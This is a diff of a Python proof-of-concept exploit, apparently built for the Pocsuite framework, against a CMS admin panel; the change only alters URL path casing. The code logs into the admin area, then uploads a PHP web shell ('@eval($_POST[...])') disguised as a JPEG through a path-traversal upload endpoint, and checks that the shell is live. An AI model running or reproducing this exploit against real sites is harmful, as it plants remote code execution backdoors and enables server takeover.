@@ -33,7 +33,7 @@ class DemoPOC(POCBase):
     def _verify(self):
         result = {}
         # payload = "path={0}".format(self.get_option("username"))
-        payload2 = "/CMS/cms/admin/login.php"
+        payload2 = "/cms/cms/admin/login.php"
         resp = requests.get(self.url+payload2)
         if resp and resp.status_code == 200 and "if(guanliyuan.length<2 || pwd.length<5){" in resp.text:
             result['VerifyInfo'] = {}
@@ -60,8 +60,8 @@ class DemoPOC(POCBase):
             "pwd": password
         }
         filename = random_str(6) + ".php"
-        s.post(url=self.url + "/CMS/cms/admin/run_ajax.php?run=login", data=login_data)
-        resp2 = s.get(self.url + "/CMS/cms/admin/index.php")
+        s.post(url=self.url + "/cms/cms/admin/run_ajax.php?run=login", data=login_data)
+        resp2 = s.get(self.url + "/cms/cms/admin/index.php")
         # print(resp2.text)
         if resp2.status_code == 200 and """<li><a href="wenjian.php?path=../../..">""" in resp2.text:
             fileList = [
@@ -69,7 +69,7 @@ class DemoPOC(POCBase):
                  ("{}".format(filename), r'''<?php echo "happy day";@eval($_POST["midi"]);?>''', "image/jpeg")), ]
             m = MultipartEncoder(fields=fileList, boundary="-------45962402127348")
             headers = {"content-type": m.content_type}
-            s.post(url=self.url + "/CMS/cms/include/up.php?run=file&path=../../../&filename=1", data=m,
+            s.post(url=self.url + "/cms/cms/include/up.php?run=file&path=../../../&filename=1", data=m,
                    headers=headers)
             if "happy day" in requests.get(url=self.url + "/" + filename).text:
                 result['ShellInfo'] = {}
